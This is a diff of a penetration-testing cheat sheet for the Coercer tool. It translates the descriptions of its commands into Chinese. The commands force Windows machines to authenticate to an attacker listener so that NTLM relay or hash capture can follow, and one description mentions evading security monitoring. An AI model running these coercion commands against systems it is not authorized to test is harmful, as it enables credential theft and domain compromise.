@@ -3,46 +3,46 @@ tags: [windows, authentication, coercion, pentest, security, active-directory, s
 
 actions:
 # === SCANNING AND RECONNAISSANCE ===
-  - title: coercer - basic scan
+  - title: coercer - 基础扫描
     desc: |
-      Performs a non-intrusive scan to identify which coercion methods are successful against a target. 
-      This is used during initial reconnaissance to map out vulnerabilities in Windows RPC and SMB services without forcing a full authentication. 
-      The tool reports back when an authentication request is successfully received on the listener side.
+      执行非侵入式扫描，识别哪些胁迫方法对目标成功。
+      这在初始侦察期间用于绘制 Windows RPC 与 SMB 服务中的漏洞，而无需强制完整认证。
+      当监听端成功收到认证请求时，工具会报告。
     command: "coercer scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - verbose scanning
+  - title: coercer - 详细扫描
     desc: |
-      Executes a scan with the verbose flag enabled to provide detailed feedback on each attempt. 
-      Use this when you need to troubleshoot failed connections or understand which specific RPC calls are being blocked. 
-      It provides a granular view of the interaction between the attacker machine and the target's remote procedures.
+      启用详细标志执行扫描，对每次尝试提供详细反馈。
+      当你需要排查连接失败或理解哪些具体 RPC 调用被阻止时使用。
+      它提供攻击机器与目标远程过程之间交互的细粒度视图。
     command: "coercer -v scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
 # === AUTHENTICATION COERCION ===
-  - title: coercer - trigger authentication
+  - title: coercer - 触发认证
     desc: |
-      Triggers authentications through all known methods using established working paths. 
-      This command is the primary way to force a target machine to authenticate to a listener for NTLM relay attacks or hash capturing. 
-      Ensure that a listener like Responder or ntlmrelayx is active on the listener IP before running this.
+      使用已建立的可用路径，通过所有已知方法触发认证。
+      该命令是迫使目标机器向监听器认证以进行 NTLM 中继攻击或哈希捕获的主要方式。
+      运行前请确保监听器 IP 上已有 Responder 或 ntlmrelayx 等监听器处于活动状态。
     command: "coercer coerce -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - targeted method coercion
+  - title: coercer - 定向方法胁迫
     desc: |
-      Runs the coercion process but limits the attempts to a specific method or protocol. 
-      This is useful when you know a specific protocol like MS-RPRN or MS-EFSR is vulnerable and want to minimize network noise. 
-      Targeting specific methods can help bypass certain security monitoring systems that look for broad scanning patterns.
+      运行胁迫过程，但将尝试限制在特定方法或协议上。
+      当你已知 MS-RPRN 或 MS-EFSR 等特定协议存在漏洞、并想尽量减少网络噪音时很有用。
+      针对特定方法有助于绕过查找广泛扫描模式的安全监控系统。
     command: "coercer coerce --methods {{method|MS-RPRN}} -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
 # === ADVANCED FUZZING ===
-  - title: coercer - path fuzzing
+  - title: coercer - 路径模糊测试
     desc: |
-      Tests every available coercion method against a comprehensive list of potential exploit paths. 
-      This mode is used when standard paths are patched or blocked to find alternative ways to trigger authentication. 
-      It is more resource-intensive and generates significant logs on the target, so use it with caution in sensitive environments.
+      针对全面的潜在利用路径列表测试每一种可用的胁迫方法。
+      当标准路径已被修补或阻止时，使用此模式查找触发认证的替代方式。
+      它更消耗资源且会在目标上生成大量日志，因此在敏感环境中请谨慎使用。
     command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - fuzz with specific export
+  - title: coercer - 带特定导出的模糊测试
     desc: |
-      Runs a fuzzing operation and saves the results to a specific file format for later analysis. 
-      This helps in documenting vulnerabilities found during a penetration test for reporting purposes. 
-      It ensures that all successful authentication triggers are recorded with their corresponding paths and methods.
+      运行模糊测试操作并将结果保存到特定文件格式，以供后续分析。
+      这有助于为报告目的记录渗透测试期间发现的漏洞。
+      它确保所有成功的认证触发都与其对应路径与方法一起被记录。
     command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}} --export-json {{filename|results.json}}"
